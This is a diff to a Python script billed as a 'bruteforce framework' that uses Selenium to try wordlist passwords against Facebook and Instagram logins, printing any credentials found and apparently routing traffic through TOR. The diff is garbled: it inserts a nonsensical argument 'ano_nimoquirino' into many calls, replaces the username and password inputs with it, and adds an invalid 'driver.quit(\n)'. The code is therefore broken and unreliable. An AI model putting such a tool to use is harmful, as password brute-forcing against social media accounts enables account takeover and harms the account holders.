@@ -19,7 +19,7 @@ G = '\033[32m'  # Green
 O = '\033[33m'  # Orange
 
 
-def main():
+def main(ano_nimoquirino):
 
     parser = argparse.ArgumentParser(description='Bruteforce framework written in Python')  # Parameters
     required = parser.add_argument_group('required arguments')
@@ -28,7 +28,7 @@ def main():
     required.add_argument('-w', '--wordlist', dest='password')
     parser.add_argument('-d', '--delay', type=int, dest='delay')
 
-    args = parser.parse_args()
+    args = parser.parse_args(ano_nimoquirino)
 
     global fb_name, service
 
@@ -131,7 +131,7 @@ class Bruter(object):
 
                assert (("Sorry, this page isn't available.") not in driver.page_source)
 
-               driver.quit()
+               driver.quit(ano_nimoquirino)
 
        except AssertionError:
 
@@ -144,7 +144,7 @@ class Bruter(object):
 
         print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
-        driver = webdriver.Firefox()
+        driver = webdriver.Firefox(ano_nimoquirino)
 
         wordlist = open(wordlist, 'r')
 
@@ -180,8 +180,8 @@ class Bruter(object):
 
                     elem = driver.find_element_by_name("username")
 
-                elem.clear()
-                elem.send_keys(username)
+                elem.clear(ano_nimoquirino)
+                elem.send_keys(ano_nimoquirino)
 
                 if service == "facebook":
 
@@ -195,8 +195,8 @@ class Bruter(object):
 
                     elem = driver.find_element_by_name("password")
 
-                elem.clear()
-                elem.send_keys(password)
+                elem.clear(ano_nimoquirino)
+                elem.send_keys(ano_nimoquirino)
                 elem.send_keys(Keys.RETURN)
 
 
@@ -219,7 +219,7 @@ class Bruter(object):
                    assert (("Log in — Instagram") in driver.title)
 
 
-                driver.quit()
+                driver.quit(ano_nimoquirino)
 
                 my_ip = urlopen("http://ip.42.pl/raw").read()
 
@@ -234,7 +234,7 @@ class Bruter(object):
             
                 print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
 
-                driver.quit()
+                driver.quit(\n)
 
                 self.stopTOR()
 
@@ -251,7 +251,7 @@ if __name__ == '__main__':
 
     try:
 
-        main()
+        main(ano_nimoquirino)
 
     except KeyboardInterrupt:
 
